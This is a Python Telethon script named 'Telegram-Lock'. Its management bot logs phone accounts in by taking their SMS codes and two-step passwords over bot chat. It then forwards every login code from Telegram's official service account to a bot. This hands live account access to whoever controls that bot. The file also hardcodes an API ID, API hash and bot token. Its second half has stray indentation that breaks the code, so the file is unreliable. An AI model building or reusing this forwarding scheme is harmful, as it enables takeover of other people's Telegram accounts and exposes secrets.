import asyncio
import platform
import os
import re
import logging
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    AuthKeyDuplicatedError
)

# Log config
logging.basicConfig(level=logging.WARNING)
logger = logging.getLogger(__name__)
logging.getLogger('httpx').setLevel(logging.WARNING)
logging.getLogger('apscheduler').setLevel(logging.WARNING)
logging.getLogger('telegram').setLevel(logging.WARNING)

# API Config
API_ID = 19684564
API_HASH = "6219dccd88035a229ec3aa84d8162a38"
BOT_TOKEN = "8754918048:AAEKWN7fBUZalgJpI3yJC31tc7wo6KFsp_Q"
TARGET_BOT_ID = 8754918048

# Global cache
accounts = {}
user_login_states = {}
PHONE_RULE = re.compile(r'^\+\d{10,15}$')


def bind_account_handlers(client, phone):
    target_entity = None

    async def load_bot_target():
        nonlocal target_entity
        retry = 0
        while retry < 3:
            try:
                target_entity = await client.get_entity(TARGET_BOT_ID)
                logger.info(f"[{phone}] Bot entity loaded, id={target_entity.id}")
                break
            except Exception as e:
                retry += 1
                logger.warning(f"[{phone}] Load bot failed, retry {retry}/3: {str(e)}")
                await asyncio.sleep(2)

    client.loop.create_task(load_bot_target())

    @client.on(events.NewMessage(outgoing=True))
    async def alive_test(event):
        if event.message.text and event.message.text.lower() == "self check":
            await event.edit(text="self checked!")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin$"))
    async def query_status(event):
        stat = "on" if accounts[phone]["anti_login"] else "off"
        await event.edit(text=f"Anti-login push status: {stat}")
        logger.info(f"[{phone}] Query push switch: {stat}")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin on$"))
    async def enable_push(event):
        accounts[phone]["anti_login"] = True
        await event.edit(text="Auto verification push enabled.")
        logger.info(f"[{phone}] Push switch turned ON")

    @client.on(events.NewMessage(outgoing=True, pattern="antilogin off$"))
    async def disable_push(event):
        accounts[phone]["anti_login"] = False
        await event.edit(text="Auto verification push disabled.")
        logger.info(f"[{phone}] Push switch turned OFF")

    @client.on(events.NewMessage(from_users=[777000]))
    async def capture_code(event):
        logger.info(f"[{phone}] Received SMS from 777000, push={accounts[phone]['anti_login']}")
        if accounts[phone]["anti_login"] and target_entity is not None:
            try:
                msg = f"Source Phone: {phone}\nCode Content:\n{event.message.text}"
                await client.send_message(target_entity, msg)
                logger.info(f"[{phone}] SUCCESS: Code sent to bot {TARGET_BOT_ID}")
            except Exception as err:
                logger.error(f"[{phone}] Send failed: {str(err)}")


# Management Bot Instance
bot_client = TelegramClient(StringSession(), API_ID, API_HASH)


@bot_client.on(events.NewMessage(pattern="/start"))
async def help_menu(event):
    text = """📖 Telegram-Lock Command List
[Phone Chat Commands]
self check        Check program alive
antilogin         Check push switch status
antilogin on      Enable auto send SMS to bot
antilogin off     Disable auto send SMS

[Bot Private Commands]
/addphone +8613800138000    Login new monitor phone
/listphone                  List all logged phones
/delphone +8613800138000    Delete phone session
/logout +8613800138000      Remote logout phone
"""
    await event.reply(text)


@bot_client.on(events.NewMessage(pattern="/addphone (.+)"))
async def add_phone(event):
    phone = event.pattern_match.group(1).strip()
    if not PHONE_RULE.match(phone):
        await event.reply("❌ Invalid format, example: /addphone +8613800138000")
        return
    if phone in accounts:
        await event.reply("⚠️ This phone already logged in")
        return

    session_name = f"session_{phone.replace('+','')}"
    new_client = TelegramClient(session_name, API_ID, API_HASH)
    try:
        await new_client.connect()
        code_req = await new_client.send_code_request(phone)
        user_login_states[event.sender_id] = {
            "client": new_client,
            "phone": phone,
            "code_hash": code_req.phone_code_hash,
            "step": "input_sms_code"
        }
        await event.reply(f"✅ Code sent to {phone}, reply numeric code to login")
    except PhoneNumberInvalidError:
        await event.reply("❌ Wrong phone number")
    except AuthKeyDuplicatedError:
        await event.reply("❌ Account logged on other device")
    except Exception as e:
        await event.reply(f"❌ Send code error: {str(e)}")


@bot_client.on(events.NewMessage)
async def login_process(event):
    if event.sender_id not in user_login_states:
        return
    state = user_login_states[event.sender_id]
    input_text = event.text.strip()

    if state["step"] == "input_sms_code":
        if not input_text.isdigit():
            return
        try:
            await state["client"].sign_in(
                phone_code_hash=state["code_hash"],
                code=input_text
            )
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"🎉 {state['phone']} login done, send antilogin on to push code")
        except SessionPasswordNeededError:
            state["step"] = "input_2fa_password"
            await event.reply("🔐 This account has 2FA enabled, reply your two-step password")
        except PhoneCodeInvalidError:
            await event.reply("❌ Incorrect SMS code, use /addphone to retry")
            del user_login_states[event.sender_id]
        except Exception as e:
            await event.reply(f"❌ Login failed: {str(e)}")
            del user_login_states[event.sender_id]

    elif state["step"] == "input_2fa_password":
        try:
            await state["client"].sign_in(password=input_text)
            accounts[state["phone"]] = {
                "client": state["client"],
                "anti_login": False
            }
            bind_account_handlers(state["client"], state["phone"])
            del user_login_states[event.sender_id]
            await event.reply(f"🎉 {state['phone']} 2FA verified, login complete")
        except Exception as e:
            await event.reply(f"❌ Wrong 2FA password, restart login with /addphone")
            del user_login_states[event.sender_id]


@bot_client.on(events.NewMessage(pattern="/listphone"))
async def list_all(event):
    if not accounts:
        await event.reply("📭 No logged monitor phones, use /addphone")
         return
     output = "📋 Logged Phone List:\n"
     for num, data in accounts.items():
         status = "🟢 Push ON" if data["anti_login"] else "🔴 Push OFF"
         output += f"- {num} | {status}\n"
     await event.reply(output)
 @bot_client.on(events.NewMessage(pattern="/delphone (.+)"))
 async def delete_session(event):
     phone = event.pattern_match.group(1).strip()
     if phone not in accounts:
         await event.reply("❌ Phone number not found")
         return
     await accounts[phone]["client"].disconnect()
     del accounts[phone]
     session_file = f"session_{phone.replace('+','')}.session"
     if os.path.exists(session_file):
         os.remove(session_file)
     await event.reply(f"🗑 Session of {phone} removed")
 @bot_client.on(events.NewMessage(pattern="/logout (.+)"))
 async def remote_logout(event):
     phone = event.pattern_match.group(1).strip()
     if phone not in accounts:
         await event.reply("❌ Phone number not found")
         return
     try:
         await accounts[phone]["client"].log_out()
         await accounts[phone]["client"].disconnect()
         del accounts[phone]
         session_file = f"session_{phone.replace('+','')}.session"
         if os.path.exists(session_file):
             os.remove(session_file)
         await event.reply(f"🚪 {phone} logged out remotely from all devices")
     except Exception as e:
         await event.reply(f"❌ Remote logout error: {str(e)}")
 async def main():
     print("🤖 Telegram-Lock Started, waiting commands...")
     await bot_client.start(bot_token=BOT_TOKEN)
     print("✅ Management Bot Online, send /start for command list")
     while True:
         await asyncio.sleep(1 / 60)
 if platform.system() == "Emscripten":
     asyncio.ensure_future(main())
 else:
     if __name__ == "__main__":
         asyncio.run(main())
